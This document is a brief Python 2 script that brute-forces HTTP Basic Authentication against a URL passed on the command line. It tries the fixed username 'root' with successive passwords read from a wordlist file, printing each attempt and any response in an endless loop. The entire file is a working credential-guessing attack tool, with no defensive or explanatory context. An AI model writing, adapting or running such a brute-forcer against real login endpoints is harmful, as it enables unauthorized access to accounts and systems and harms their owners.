#!/usr/bin/env python
import sys, urllib2, getpass
f = open('/root/Videos/xaa','r')

class BasePassword(urllib2.HTTPPasswordMgr):
    def find_user_password(self, realm, authurl):
        ret = urllib2.HTTPPasswordMgr.find_user_password(self, realm, authurl)

        if ret[0] == None and ret[1] == None:
            sys.stdout.write("Login reauired for %s at %s" % (realm, authurl))
            username = 'root'
            password = f.readline().strip()
            print username,password
            return (username, password)
        else:
            return ret

while 1:
    try:
        req = urllib2.Request(sys.argv[1])
        opener = urllib2.build_opener(urllib2.HTTPBasicAuthHandler(BasePassword()))
        response = opener.open(req)
        print response.read()
    except:
        pass

